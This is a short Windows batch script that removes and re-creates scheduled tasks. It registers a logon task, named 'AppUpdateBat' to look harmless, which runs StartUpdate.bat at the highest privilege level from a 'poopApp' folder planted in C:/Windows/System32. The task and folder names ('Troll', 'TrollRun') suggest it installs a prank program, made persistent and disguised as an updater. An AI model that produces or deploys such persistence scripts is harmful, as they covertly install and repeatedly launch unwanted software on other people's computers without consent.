@echo off

SCHTASKS /DELETE /TN "Troll" /F
SCHTASKS /DELETE /TN "TrollRun" /F
SCHTASKS /DELETE /TN "AppUpdate" /F
SCHTASKS /DELETE /TN "AppUpdateBat" /F


:: SCHTASKS /CREATE /SC ONLOGON /TN "Troll" /TR "C:/Windows/System32/poopApp/App.pyw" /RL HIGHEST
:: SCHTASKS /CREATE /SC ONLOGON /TN "TrollRun" /TR "C:/Windows/System32/poopApp/RUN.bat" /RL HIGHEST
:: SCHTASKS /CREATE /SC ONLOGON /TN "AppUpdate" /TR "C:/Windows/System32/poopApp/updater.pyw" /RL HIGHEST
SCHTASKS /CREATE /SC ONLOGON /TN "AppUpdateBat" /TR "C:/Windows/System32/poopApp/StartUpdate.bat" /RL HIGHEST